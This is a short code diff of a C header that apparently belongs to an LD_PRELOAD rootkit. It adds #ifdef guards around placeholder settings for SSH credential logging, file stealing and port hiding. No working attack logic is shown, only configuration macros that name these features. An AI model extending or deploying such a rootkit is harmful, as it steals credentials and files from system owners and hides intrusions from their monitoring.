@@ -11,13 +11,20 @@
 #define SOPATH "??SOPATH??"
 #define LDSO_PRELOAD "??LDSO_PRELOAD??"
 
+#ifdef LOG_SSH
+#define SSH_LOGS "??SSH_LOGS??" // [LOG_SSH]
+#endif
+#ifdef FILE_STEAL
 #define INTEREST_DIR "??INTEREST_DIR??" // [FILE_STEAL]
+#endif
+#ifdef HIDE_PORTS
 #define HIDEPORTS "??HIDEPORTS??" // [HIDE_PORTS]
+#endif
 
 //#define PATH_MAX 4096
 #define LINE_MAX 2048
 
-typedef struct symbol_struct {
+typedef struct {
     void *(*func)();
 } syms;
 
